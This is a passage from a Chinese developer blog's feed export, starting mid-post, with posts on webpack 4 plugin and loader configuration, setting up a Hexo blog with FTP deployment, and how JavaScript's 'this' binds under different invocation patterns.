class="line">                <span class="comment">// 移除注释</span></span><br><span class="line">                removeComments: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 不要留下任何空格</span></span><br><span class="line">                collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 当值匹配默认值时删除属性</span></span><br><span class="line">                removeRedundantAttributes: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 使用短的doctype替代doctype</span></span><br><span class="line">                useShortDoctype: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 移除空属性</span></span><br><span class="line">                removeEmptyAttributes: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 从style和link标签中删除type="text/css"</span></span><br><span class="line">                removeStyleLinkTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 保留单例元素的末尾斜杠。</span></span><br><span class="line">                keepClosingSlash: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 在脚本元素和事件属性中缩小JavaScript(使用UglifyJS)</span></span><br><span class="line">                minifyJS: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 缩小CSS样式元素和样式属性</span></span><br><span class="line">                minifyCSS: <span class="literal">true</span>,</span><br><span class="line">                <span class="comment">// 在各种属性中缩小url</span></span><br><span class="line">                minifyURLs: <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="mini-css-extract-plugin"><a href="#mini-css-extract-plugin" class="headerlink" title="mini-css-extract-plugin"></a>mini-css-extract-plugin</h3><p>自带插件，为每个引入 css 的 JS 文件创建一个 css 文件，css抽离，并写入html。  </p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MiniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">"mini-css-extract-plugin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">            filename: <span class="string">"[name].[hash].css"</span>,</span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="clean-webpack-plugin"><a href="#clean-webpack-plugin" class="headerlink" title="clean-webpack-plugin"></a>clean-webpack-plugin</h3><p>删除文件夹，避免因为生成的文件带hash,而一直存在。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev clean-webpack-plugin</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> CleanWebpackPlugin = <span class="built_in">require</span>(<span class="string">"clean-webpack-plugin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="keyword">new</span> CleanWebpackPlugin([<span class="string">"dist"</span>])</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="HotModuleReplacementPlugin"><a href="#HotModuleReplacementPlugin" class="headerlink" title="HotModuleReplacementPlugin"></a>HotModuleReplacementPlugin</h3><p>启用热替换模式。  </p>
<h3 id="NamedModulesPlugin"><a href="#NamedModulesPlugin" class="headerlink" title="NamedModulesPlugin"></a>NamedModulesPlugin</h3><p>在控制台中输出可读的模块名。</p>
<h3 id="HashedModuleIdsPlugin"><a href="#HashedModuleIdsPlugin" class="headerlink" title="HashedModuleIdsPlugin"></a>HashedModuleIdsPlugin</h3><p>文件未变动时，保持build出来的文件hash不变。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 三种插件webpack自带</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    plugins: [</span><br><span class="line">        <span class="comment">// 启用 HMR</span></span><br><span class="line">        <span class="keyword">new</span> webpack.HotModuleReplacementPlugin(),</span><br><span class="line">        <span class="comment">// 在控制台中输出可读的模块名</span></span><br><span class="line">        <span class="keyword">new</span> webpack.NamedModulesPlugin(),</span><br><span class="line">        <span class="comment">// 不做改动hash保持不变</span></span><br><span class="line">        <span class="keyword">new</span> webpack.HashedModuleIdsPlugin()</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="performance"><a href="#performance" class="headerlink" title="performance"></a>performance</h2><p>配置如何展示性能提示。  </p>
<p>默认不配置下开启devServer时，会提示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">WARNING <span class="keyword">in</span> asset size <span class="built_in">limit</span>: The following asset(s) exceed the recommended size <span class="built_in">limit</span> (244 KiB).</span><br><span class="line">This can impact web performance.</span><br><span class="line">Assets:</span><br><span class="line">  vendor.256a0afe197a0724d634.js (1.67 MiB)</span><br><span class="line"></span><br><span class="line">WARNING <span class="keyword">in</span> entrypoint size <span class="built_in">limit</span>: The following entrypoint(s) combined asset size exceeds the recommended <span class="built_in">limit</span> (244 KiB). This can impact web performance.</span><br><span class="line">Entrypoints:</span><br><span class="line">  index (1.8 MiB)</span><br><span class="line">      vendor.256a0afe197a0724d634.js</span><br><span class="line">      index.256a0afe197a0724d634.css</span><br><span class="line">      index.256a0afe197a0724d634.js</span><br><span class="line"></span><br><span class="line">WARNING <span class="keyword">in</span> webpack performance recommendations:</span><br><span class="line">You can <span class="built_in">limit</span> the size of your bundles by using import() or require.ensure to lazy load some parts of your application.</span><br><span class="line">For more info visit https://webpack.js.org/guides/code-splitting/</span><br></pre></td></tr></table></figure>
<p>因为限制了文件大小为250kb，如果超过就会提示；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    performance: &#123;</span><br><span class="line">        <span class="comment">// false | "error" | "warning" // 不显示性能提示 | 以错误形式提示 | 以警告...</span></span><br><span class="line">        hints: <span class="string">"warning"</span>,</span><br><span class="line">        <span class="comment">// 开发环境设置较大防止警告</span></span><br><span class="line">        <span class="comment">// 根据入口起点的最大体积，控制webpack何时生成性能提示,整数类型,以字节为单位</span></span><br><span class="line">        maxEntrypointSize: <span class="number">5000000</span>,</span><br><span class="line">        <span class="comment">// 最大单个资源体积，默认250000 (bytes)</span></span><br><span class="line">        maxAssetSize: <span class="number">3000000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>loader 用于对模块的源代码进行转换。我们可以使用loader将less/sass/scss/stylus转为css并压缩、兼容处理等，可以将js es6/7语法转为es5等等。  </p>
<h3 id="处理less"><a href="#处理less" class="headerlink" title="处理less"></a>处理less</h3><p>安装：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev less css-loader postcss-loader less-loader autoprefixer mini-css-extract-plugin</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// css抽离</span></span><br><span class="line"><span class="keyword">const</span> MiniCssExtractPlugin = <span class="built_in">require</span>(<span class="string">"mini-css-extract-plugin"</span>);</span><br><span class="line"><span class="comment">// 使用mini-css-extract-plugin则不能用style-loader</span></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.less$/</span>,</span><br><span class="line">                <span class="comment">// 只解析改目录的文件</span></span><br><span class="line">                include: path.resolve(__dirname, <span class="string">"src"</span>),</span><br><span class="line">                use: [</span><br><span class="line">                    MiniCssExtractPlugin.loader,</span><br><span class="line">                    <span class="comment">// "style-loader",</span></span><br><span class="line">                    <span class="string">"css-loader"</span>,</span><br><span class="line">                    &#123;</span><br><span class="line">                        loader: <span class="string">"postcss-loader"</span>,</span><br><span class="line">                        options: &#123;</span><br><span class="line">                            plugins: [</span><br><span class="line">                                <span class="built_in">require</span>(<span class="string">"autoprefixer"</span>)(&#123;</span><br><span class="line">                                    browsers: [</span><br><span class="line">                                        <span class="string">"ie &gt;= 11"</span>,</span><br><span class="line">                                        <span class="string">"ff &gt;= 30"</span>,</span><br><span class="line">                                        <span class="string">"chrome &gt;= 34"</span>,</span><br><span class="line">                                        <span class="string">"safari &gt;= 7"</span>,</span><br><span class="line">                                        <span class="string">"opera &gt;= 23"</span>,</span><br><span class="line">                                        <span class="string">"ios &gt;= 7"</span>,</span><br><span class="line">                                        <span class="string">"android &gt;= 4.4"</span>,</span><br><span class="line">                                        <span class="string">"bb &gt;= 10"</span></span><br><span class="line">                                    ]</span><br><span class="line">                                &#125;)</span><br><span class="line">                            ]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    <span class="string">"less-loader"</span></span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用<code>mini-css-extract-plugin</code>会将js中的css抽离出来，打包成单独的文件，从而避免默认情况下，打包后，由于css通过js动态插入到html中，导致页面闪动。<br>使用<code>css-loder</code>能够解析js中引入的css:<code>import &quot;main.less&quot;</code>。<br>使用<code>style-loader</code>把加载的css作为style标签内容插入到html中。<br>使用<code>postcss-loader autoprefixer</code>能够将css代码自动加兼容性前缀，配置如上代码。<br>使用<code>less-loader</code>将less代码转为css。  </p>
<h3 id="babel-loader"><a href="#babel-loader" class="headerlink" title="babel-loader"></a>babel-loader</h3><p>Babel是编写下一代JavaScript的编译器，可以将当前运行平台(浏览器、node服务器)尚不支持的下一代或几代js语法编译为当前支持的js语法版本。<br>使用babel-loader将es6/7语法转为es5浏览器可执行代码。  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// babel-loader已经升级到了8，需要装@babel/core，但是还是有问题，所以这里安装@7.1.5</span><br><span class="line">cnpm i --save-dev babel-loader@7.1.5 babel-core babel-preset-env babel-polyfill</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [&#123;</span><br><span class="line">            test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">            <span class="comment">// 只解析include文件夹内的</span></span><br><span class="line">            include: path.resolve(__dirname, <span class="string">"src"</span>),</span><br><span class="line">            <span class="comment">// 排除node_modules文件夹</span></span><br><span class="line">            exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">            use: [&#123;</span><br><span class="line">                <span class="comment">// cacheDirectory = true 使用缓存，提高性能，将 babel-loader 提速至少两倍</span></span><br><span class="line">                loader: <span class="string">"babel-loader?cacheDirectory"</span>,</span><br><span class="line">                options: &#123;</span><br><span class="line">                    presets: [</span><br><span class="line">                        [</span><br><span class="line">                            <span class="string">"env"</span>,</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="string">"modules"</span>: <span class="literal">false</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        ],</span><br><span class="line">                        <span class="comment">// 包含stage-1, stage-2以及stage-3的所有功能,个人开发就直接上最新的了，爽</span></span><br><span class="line">                        <span class="string">"stage-0"</span></span><br><span class="line">                    ],</span><br><span class="line">                    plugins: [</span><br><span class="line">                        <span class="string">"transform-es2015-modules-commonjs"</span></span><br><span class="line">                    ]</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;]</span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>babel-preset-env</code> 是一个新的 preset，（presets是一系列plugin的集合）可以根据配置的目标运行环境,自动启用需要的 babel 插件，由于<strong>Preset 的执行顺序时从最后一个逆序执行</strong>，所以<code>env</code>写在最前，就当是保底…  但是使用preset依然不会解析Set/Map这样的，这时候就要用<code>babel-polyfill</code>了。<br><code>babel-polyfill</code>简单描述就是<strong>只要引入了<code>babel-polyfill</code>你可以大胆的用ES6</strong>，可参考<a href="https://www.imooc.com/article/21866" target="_blank" rel="noopener">ES6和Babel你不知道的事儿</a>,但是使用后会使代码体积增大，视需求而定。在文件入口引入<code>babel-polyfill</code>即可使用： <code>import &quot;babel-polyfill&quot;</code>.<br><code>stage-0</code>是对ES7一些提案的支持，<code>Babel</code>通过插件的方式引入，让Babel可以编译ES7代码。当然由于ES7没有定下来，所以这些功能随时肯能被废弃掉的。参考：<a href="https://www.cnblogs.com/chris-oil/p/5717544.html" target="_blank" rel="noopener">如何区分Babel中的stage-0,stage-1,stage-2以及stage-3</a>，其通过插件方式引入，所以需要安装：  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev babel-preset-stage-0</span><br></pre></td></tr></table></figure>
<h3 id="url-loader"><a href="#url-loader" class="headerlink" title="url-loader"></a>url-loader</h3><p>使用url-loader而非file-loader，因为前者包含了后者，提供了更为强大的功能。他可以解决css样式中引入的图片文件等打包后路径指向不正确和将图片转为DataURL模式（base64编码的字符串形式，<a href="https://www.cnblogs.com/xuechenlei/p/5940371.html" target="_blank" rel="noopener">More：DATA URL简介及DATA URL的利弊</a>）从而提高网站的加载速度。更多参考：<a href="https://blog.csdn.net/qq_38652603/article/details/73835153" target="_blank" rel="noopener">file-loader 和 url-loader</a>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cnpm i --save-dev url-loader file-loader</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [&#123;</span><br><span class="line">            <span class="comment">// 处理引入的图片视频字体等文件的loader</span></span><br><span class="line">            <span class="comment">// 将小于10k的图片文件转为DataURL,并且设置默认的dist中存放方式</span></span><br><span class="line">            test: <span class="regexp">/\.(eot|woff|woff2|ttf|svg|png|jpe?g|gif|mp4|webm)(\?\S*)?$/</span>,</span><br><span class="line">            loader: <span class="string">"url-loader?limit=10240&amp;name=static/assets/[name]_[hash].[ext]"</span></span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="optimization"><a href="#optimization" class="headerlink" title="optimization"></a>optimization</h2><p>优化。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// css优化压缩</span></span><br><span class="line"><span class="keyword">const</span> OptimizeCSSAssetsPlugin = <span class="built_in">require</span>(<span class="string">"optimize-css-assets-webpack-plugin"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> config = &#123;</span><br><span class="line">    optimization: &#123;</span><br><span class="line">        <span class="comment">// 公共代码抽取</span></span><br><span class="line">        <span class="comment">// CommonsChunkPlugin 已弃用，使用optimization.splitChunks代替</span></span><br><span class="line">        <span class="comment">// 提取被重复引入的文件，单独生成一个或多个文件，这样避免在多入口重复打包文件</span></span><br><span class="line">        splitChunks: &#123;</span><br><span class="line">            cacheGroups: &#123;</span><br><span class="line">                commons: &#123;</span><br><span class="line">                    <span class="comment">// 选择全部chunk</span></span><br><span class="line">                    chunks: <span class="string">"all"</span>,</span><br><span class="line">                    <span class="comment">// 生成的公共代码文件名，惯用vendor</span></span><br><span class="line">                    name: <span class="string">"vendor"</span>,</span><br><span class="line">                    <span class="comment">// 作用于</span></span><br><span class="line">                    test: <span class="regexp">/[\\/]node_modules[\\/]/</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">// 压缩代码，默认开启</span></span><br><span class="line">        <span class="comment">// minimize: true,</span></span><br><span class="line">        <span class="comment">// 压缩配置</span></span><br><span class="line">        minimizer: [</span><br><span class="line">            <span class="comment">// 优化压缩css</span></span><br><span class="line">            <span class="keyword">new</span> OptimizeCSSAssetsPlugin(&#123;&#125;),</span><br><span class="line">            <span class="comment">// 压缩js配置</span></span><br><span class="line">            <span class="keyword">new</span> UglifyJsPlugin(&#123;</span><br><span class="line">                cache: <span class="literal">true</span>,</span><br><span class="line">                parallel: <span class="literal">true</span>,</span><br><span class="line">                sourceMap: <span class="literal">true</span></span><br><span class="line">            &#125;)</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="build"><a href="#build" class="headerlink" title="build"></a>build</h1><p>使用<code>webpack</code>命令即可开始构建，也可以自定义命令<code>npm run build</code>：</p>
<p>package.json:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"scripts"</span>: &#123;</span><br><span class="line">        <span class="attr">"build"</span>: <span class="string">"webpack"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h1><p>Github：<a href="https://github.com/simmzl/webpack4-config" target="_blank" rel="noopener">webpack4-config</a></p>
]]></content>
      <categories>
        <category>Webpack</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>node</tag>
        <tag>webpack</tag>
      </tags>
  </entry>
  <entry>
    <title>以后就在这里写Blog了</title>
    <url>/2017/09/%E4%BB%A5%E5%90%8E%E5%B0%B1%E5%9C%A8%E8%BF%99%E9%87%8C%E5%86%99BLOG%E4%BA%86.html</url>
    <content><![CDATA[<h4 id="初衷"><a href="#初衷" class="headerlink" title="初衷"></a>初衷</h4><p>最早的时候，我使用wordpress在自己的云服务器上搭建了博客，可是wordpress体积还是有些大的，有着繁琐的后台管理程序和数据库，因为一次倒腾配置文件的失误或者插件安装的问题，导致整个博客后台无法运行，删除了wordpress之后就没有再写博客了。<br>后来开始在CSDN上写，CSDN还是有诸多限制的，而且CSDN给我一种只适合写技术类文章的感觉，不过好在值得信任，方便，打开即用。<br>不过作为前端，还是想有个由自己域名搭建的轻量级博客，除了技术类文章也可以发发吐槽、照片之类的东西，一切由自己决定。<br><a id="more"></a></p>
<h4 id="选择hexo"><a href="#选择hexo" class="headerlink" title="选择hexo"></a>选择hexo</h4><p>昨天看了一些安装Hexo的文章，很有帮助，比如<a href="http://lowrank.science/Hexo-Github/" target="_blank" rel="noopener">知行合一 | 用 Hexo 搭建博客</a>；<br>找了很多主题，逛了不少由hexo搭建的博客，最终在<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">next</a>和<a href="https://github.com/litten/hexo-theme-yilia" target="_blank" rel="noopener">yilia</a>之间选择了<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">next.mist</a>；<br>其中yilia的作者<a href="http://litten.me/" target="_blank" rel="noopener">litten</a>的博客很值得一看，很喜欢他生活的态度。</p>
<h4 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h4><p>当然在配置hexo中也遇到一些坑，</p>
<ul>
<li>在<strong>站点配置文件</strong>中配置本该在<strong>主题配置文件</strong>中配置的选项</li>
<li><a href="https://www.zhihu.com/question/38219432" target="_blank" rel="noopener">hexo d 出错</a></li>
<li>忘了…</li>
</ul>
<p>不过好在next的<a href="http://theme-next.iissnan.com/" target="_blank" rel="noopener">官方文档</a>很详细和搜索引擎的强大。</p>
<h4 id="CSDN–-gt-MD"><a href="#CSDN–-gt-MD" class="headerlink" title="CSDN–&gt;MD"></a>CSDN–&gt;MD</h4><p>在CSDN上也写了一些文章，都是学习前端遇到的问题。倒腾了很久，想找个工具能够把文章批量转成hexo所用的md格式，从而转进hexo，无奈都是python和java写的，对运行环境要求严格，还有各种扩展包。最终在Github上找到了<a href="https://github.com/island205/h2m" target="_blank" rel="noopener">h2m</a>，js写的，能够在线将html代码转成md格式，（还是js好呀，一个浏览器搞定）虽然不能批量处理，不过就当是重温以前的笔记了，而且我也添加了很多现在的见解。</p>
<h4 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h4><p>以后要是图多的话，图床必不可少，七牛云服务不错，推荐个<a href="http://blog.lzhaofu.cn/2016/08/26/图床神器-Windows下的图片上传工具MPic/" target="_blank" rel="noopener">Windows下的图片上传工具MPic</a>,是个提高效率的好工具。（大佬们想用的工具找不到一言不合就自己写个…）</p>
<h4 id="FTPSync"><a href="#FTPSync" class="headerlink" title="FTPSync"></a>FTPSync</h4><p>GitHub Pages屏蔽了百度的爬虫，要想让自己的blog被百度收录，网上很多方法是再托管一份在coding.net上，我配置了一下，发现从coding.net那边跳转过来时，会被强行加上一个coding.net的中转页面，如果想去掉只能充钱升级为￥199/年的黄金会员或者在首页写上Hosted by Coding Pages……这怎么能忍!<br>既然自己有域名和云服务器，干脆直接将文件也上传一份到自己的服务器上好的。于是我在网站后台新建站点blog.simmzl.cn,并为其创建个相应目录的FTP账号。<a href="https://hexo.io/zh-cn/docs/deployment.html" target="_blank" rel="noopener">HEXO官方文档</a>中部署方式除了GIT，还有FTPSync：<br>安装 hexo-deployer-ftpsync。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-ftpsync --save-dev</span><br></pre></td></tr></table></figure>
<p>修改配置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: ftpsync</span><br><span class="line">  host: &lt;host&gt; //主机地址，自己的IP地址或者网址</span><br><span class="line">  user: &lt;user&gt; //FTP的用户名</span><br><span class="line">  pass: &lt;password&gt; //FTP的密码</span><br><span class="line">  remote: [remote] //远程主机的根目录	写  /  就好了</span><br><span class="line">  port: [port] //FTP端口，21</span><br><span class="line">  ignore: [ignore] //忽略的文件或目录 </span><br><span class="line">  connections: [connections] //使用的连接数 默认1</span><br><span class="line">  verbose: [true|false] //显示调试信息</span><br></pre></td></tr></table></figure>
<p>配置之后，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>上传成功。</p>
<h4 id="关于电脑迁移"><a href="#关于电脑迁移" class="headerlink" title="关于电脑迁移"></a>关于电脑迁移</h4><p>从大学电脑 -&gt; 公司电脑 -&gt; 个人mac pro ，一共迁移了两次。</p>
<p>删除一些不必要的文件：<code>.deploy_git</code>文件夹里除<code>.git</code>外的所有文件、执行<code>hexo clean</code>删除<code>public</code>下的发布文件，然后通过u盘拷贝到新电脑，(也可以通过github仓库）<code>npm install</code>即可，mac 下需全局安装hexo <code>sudo npm install -g hexo</code></p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>标签插件：<a href="https://hexo.io/zh-cn/docs/tag-plugins.html" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/tag-plugins.html</a></p>
<p>使用blockquote可引入图片视频、jsFiddle等</p>
<img src="/images/test.jpg" class="simmzl has-title" width="500" title="Demo">
<img src="/images/test.jpg" class="simmzl no-shadow" width="1000">]]></content>
      <categories>
        <category>Prattle</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>函数的几个附加属性：this、arguments、length、prototype等</title>
    <url>/2017/10/%E5%87%BD%E6%95%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E9%99%84%E5%8A%A0%E5%B1%9E%E6%80%A7%EF%BC%9Athis%E3%80%81arguments%E3%80%81length%E3%80%81prototype%E7%AD%89.html</url>
    <content><![CDATA[<p>在《JavaScript语言精粹》（蝴蝶书）中讲到函数除了声明定义的参数外，每个函数都接受两个附加的参数：this 和 arguments 。</p>
<h1 id="其中this有四个调用模式："><a href="#其中this有四个调用模式：" class="headerlink" title="其中this有四个调用模式："></a>其中this有四个调用模式：</h1><p>this指向取决于谁调用它，谁调用指向谁。</p>
<ul>
<li>方法调用模式</li>
<li>函数调用模式</li>
<li>构造器调用模式</li>
<li>apply调用模式</li>
</ul>
<a id="more"></a>
<h2 id="方法调用模式"><a href="#方法调用模式" class="headerlink" title="方法调用模式"></a>方法调用模式</h2><p>一个函数被保存为对象的一个属性时，称该函数为一个方法，此时this指向该对象，通过this去访问该对象的属性，取值或者修改；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myObj = &#123;</span><br><span class="line">    value : <span class="number">0</span>,</span><br><span class="line">    test : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.value +=<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.test() <span class="comment">//1</span></span><br></pre></td></tr></table></figure>
<h2 id="函数调用模式"><a href="#函数调用模式" class="headerlink" title="函数调用模式"></a>函数调用模式</h2><p>当一个函数不是一个对象的属性时，而是单独存在时，那么它被当作一个函数调用，此时函数内部的this指向全局对象；</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="keyword">var</span> test = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> value = <span class="number">2</span>; <span class="comment">//私有变量</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.value );<span class="comment">//1</span></span><br><span class="line">    <span class="built_in">console</span>.log(value );<span class="comment">//2</span></span><br><span class="line">&#125;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
<p>假如该函数是一个函数的内部函数，那么其this应绑定其外部函数的this变量，即和外部this的指向相同，但是js并不是这样，这也是js设计的缺陷之一；在inner()中，this指向了全局对象，而不是指向了myObj;</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> value = <span class="number">1</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="keyword">var</span> myObj = &#123;</span><br><span class="line">    value : <span class="number">0</span>,</span><br><span class="line">    test : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.value);<span class="comment">//0</span></span><br><span class="line">        <span class="keyword">var</span> inner = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.value);<span class="comment">//1</span></span><br><span class="line">            <span class="built_in">console</span>.log(value);<span class="comment">//1</span></span><br><span class="line">        &#125;</span><br><span class="line">        inner();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">myObj.test();</span><br></pre></td></tr></table></figure>
<p>解决方法：在外部函数test中定义一个变量，赋值为this;</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">test : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.value);<span class="comment">//0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> that = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> inner = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(that.value);<span class="comment">//0</span></span><br><span class="line">        <span class="built_in">console</span>.log(value);<span class="comment">//1</span></span><br><span class="line">    &#125;</span><br><span class="line">    inner();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="构造器调用模式"><a href="#构造器调用模式" class="headerlink" title="构造器调用模式"></a>构造器调用模式</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Person = <span class="function"><span class="keyword">function</span> (<span class="params">str,num</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = str;</span><br><span class="line">    <span class="keyword">this</span>.age = num;</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> me = <span class="keyword">new</span> Person(<span class="string">"simmzl"</span>,<span class="number">21</span>);</span><br><span class="line">me.getName();<span class="comment">//simmzl</span></span><br></pre></td></tr></table></figure>
<p><strong>通过构造函数实例化一个新的对象时，构造函数中this会随之绑定到该新对象；</strong></p>
<h2 id="Apply-调用模式"><a href="#Apply-调用模式" class="headerlink" title="Apply 调用模式"></a>Apply 调用模式</h2><p>每个函数都有call()和apply()方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">obj.call(thisObj, arg1, arg2, ...);</span><br><span class="line">obj.apply(thisObj, [arg1, arg2, ...]);</span><br></pre></td></tr></table></figure>
<p>两者作用一致，都是把obj(即<strong>this</strong>)绑定到thisObj，这时候thisObj具备了obj的属性和方法。或者说thisObj『继承』了obj的属性和方法。</p>
